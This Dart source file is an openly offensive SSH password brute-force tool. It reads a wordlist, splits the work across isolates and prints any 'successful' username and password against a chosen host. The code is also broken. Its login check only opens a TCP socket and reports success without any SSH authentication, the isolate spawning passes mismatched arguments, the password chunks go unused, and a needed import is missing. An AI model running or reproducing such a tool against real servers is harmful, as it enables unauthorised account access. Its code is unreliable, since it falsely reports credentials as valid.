import 'dart:io';
import 'dart:async';
import 'dart:convert';

class Config {
  String host = '';
  int port = 22;
  String user = '';
  String wordlist = '';
  int threads = 4;
  int timeout = 10;
}

Future<bool> trySSHLogin(String host, int port, String user, String password, int timeout) async {
  try {
    final socket = await Socket.connect(host, port, timeout: Duration(seconds: timeout));
    
    // Simple check - in real implementation you'd implement SSH protocol
    await socket.destroy();
    return true;
  } catch (e) {
    return false;
  }
}

Future<void> worker(Config config, List<String> passwords, SendPort sendPort) async {
  for (final password in passwords) {
    if (await trySSHLogin(config.host, config.port, config.user, password, config.timeout)) {
      sendPort.send('[SUCCESS] ${config.user}:$password');
      return;
    }
  }
}

Future<void> main(List<String> args) async {
  final config = Config();
  
  // Parse arguments
  for (int i = 0; i < args.length; i++) {
    switch (args[i]) {
      case '-h':
      case '--host':
        config.host = args[++i];
        break;
      case '-p':
      case '--port':
        config.port = int.parse(args[++i]);
        break;
      case '-u':
      case '--user':
        config.user = args[++i];
        break;
      case '-w':
      case '--wordlist':
        config.wordlist = args[++i];
        break;
      case '-t':
      case '--threads':
        config.threads = int.parse(args[++i]);
        break;
      case '-T':
      case '--timeout':
        config.timeout = int.parse(args[++i]);
        break;
    }
  }
  
  if (config.host.isEmpty || config.user.isEmpty || config.wordlist.isEmpty) {
    print('Usage: dart ssh_brute_dart.dart --host <host> --user <user> --wordlist <file> [options]');
    return;
  }
  
  print('Starting SSH brute force on ${config.host}:${config.port}');
  print('Target: ${config.user}');
  print('Threads: ${config.threads}');
  print('Timeout: ${config.timeout} seconds');
  print('----------------------------------------');
  
  // Load wordlist
  final file = File(config.wordlist);
  final passwords = await file.readAsLines();
  print('Loaded ${passwords.length} passwords');
  
  // Create receive port
  final receivePort = ReceivePort();
  
  // Split passwords among isolates
  final chunkSize = passwords.length ~/ config.threads;
  final isolates = <Isolate>[];
  
  for (int i = 0; i < config.threads; i++) {
    final startIdx = i * chunkSize;
    final endIdx = (i == config.threads - 1) ? passwords.length : (i + 1) * chunkSize;
    final chunk = passwords.sublist(startIdx, endIdx);
    
    final isolate = await Isolate.spawn(
      worker,
      config,
      onExit: receivePort.sendPort,
    );
    
    isolates.add(isolate);
  }
  
  // Wait for results
  await for (final result in receivePort) {
    if (result is String && result.startsWith('[SUCCESS]')) {
      print(result);
      
      // Clean up
      for (final isolate in isolates) {
        isolate.kill();
      }
      receivePort.close();
      return;
    }
  }
  
  // Clean up
  for (final isolate in isolates) {
    isolate.kill();
  }
  receivePort.close();
  
  print('No valid credentials found');
}
